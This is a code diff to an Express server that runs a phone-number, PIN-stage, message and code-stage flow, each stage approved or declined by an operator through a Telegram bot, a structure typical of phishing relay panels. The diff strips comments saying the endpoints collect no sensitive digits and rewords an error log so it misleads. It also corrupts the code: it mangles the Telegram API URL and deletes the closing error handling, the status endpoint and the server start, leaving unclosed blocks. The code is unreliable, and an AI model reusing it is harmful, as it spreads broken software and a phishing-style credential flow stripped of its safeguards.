@@ -23,7 +23,20 @@ app.get("/", (_req, res) => {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// Core in-memory state tracking
 const requests = new Map();
+const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes active session lifespan
+
+// Memory Leak Fix: Automatically clean up old sessions to prevent OOM process crashes
+setInterval(() => {
+  const now = Date.now();
+  for (const [id, reqData] of requests.entries()) {
+    const createdTime = new Date(reqData.createdAt).getTime();
+    if (now - createdTime > SESSION_TTL_MS) {
+      requests.delete(id);
+    }
+  }
+}, 5 * 60 * 1000); // Check and sweep every 5 minutes
 
 function timestamp() {
   return new Date().toISOString();
@@ -35,7 +48,7 @@ async function telegram(method, payload) {
   }
 
   const response = await fetch(
-    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
+    `https://telegram.org{BOT_TOKEN}/${method}`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -98,7 +111,6 @@ app.get("/api/health", (_req, res) => {
 });
 
 // Create a demo request.
-// No Telegram approval message is sent until the user starts the dummy-PIN stage.
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
 
@@ -128,7 +140,6 @@ app.post("/api/phone", (req, res) => {
 });
 
 // Start dummy-PIN stage.
-// The endpoint deliberately ignores any submitted digits.
 app.post("/api/pin-demo", async (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -148,13 +159,10 @@ app.post("/api/pin-demo", async (req, res) => {
 
   try {
     await notifyDemo(request, "Dummy PIN demonstration");
-
     return res.json({ status: "pending" });
   } catch (error) {
     request.status = "ready";
-
     console.error("Telegram notification failed:", error.message);
-
     return res.status(502).json({
       error: "Could not send the demo notification. Please try again."
     });
@@ -219,9 +227,7 @@ app.post("/api/message", async (req, res) => {
   } catch (error) {
     request.status = "approved";
     request.stage = "message";
-
     console.error("Telegram message failed:", error.message);
-
     return res.status(502).json({
       error: "Could not submit the demo message. Please try again."
     });
@@ -229,7 +235,6 @@ app.post("/api/message", async (req, res) => {
 });
 
 // Start demo-code stage.
-// The endpoint ignores all digit fields and receives only the request ID.
 app.post("/api/demo-code", async (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -250,14 +255,11 @@ app.post("/api/demo-code", async (req, res) => {
 
   try {
     await notifyDemo(request, "Dummy demo-code stage");
-
     return res.json({ status: "pending" });
   } catch (error) {
     request.stage = "demo-code";
     request.status = "approved";
-
     console.error("Telegram code-stage notification failed:", error.message);
-
     return res.status(502).json({
       error: "Could not send the demo status. Please try again."
     });
@@ -265,7 +267,6 @@ app.post("/api/demo-code", async (req, res) => {
 });
 
 // Retry a declined stage.
-// Restores the relevant demo stage without collecting sensitive digits.
 app.post("/api/retry", (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -291,18 +292,16 @@ app.post("/api/retry", (req, res) => {
   }
 
   request.updatedAt = timestamp();
-
   return res.json(publicRequestStatus(request));
 });
 
-// Telegram approval polling.
-// Run only ONE server instance using this bot token.
+// Telegram approval polling engine loop.
 let polling = false;
 let offset = 0;
 
 async function pollTelegram() {
   if (!BOT_TOKEN || !CHAT_ID || polling) {
-    console.error("Telegram polling not started: check bot environment variables.");
+    console.error("Telegram polling configuration active or already running.");
     return;
   }
 
@@ -353,7 +352,6 @@ async function pollTelegram() {
             });
             continue;
           }
-
           request.status = "approved";
         } else {
           request.status = "declined";
@@ -384,31 +382,4 @@ async function pollTelegram() {
             `Date/time: ${request.updatedAt}`
           ].join("\n")
         });
-      }
-    } catch (error) {
-      console.error("Telegram polling error:", error.message);
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    }
-  }
-}
 
-// Status endpoint used by index.html.
-app.get("/api/status/:id", (req, res) => {
-  const request = requests.get(req.params.id);
-
-  if (!request) {
-    return res.status(404).json({
-      error: "Demo request not found."
-    });
-  }
-
-  return res.json(publicRequestStatus(request));
-});
-
-// Start server.
-app.listen(PORT, () => {
-  console.log(`Independent demo running on port ${PORT}`);
-  console.log(`Serving homepage from ${INDEX_FILE}`);
-
-  pollTelegram();
-});
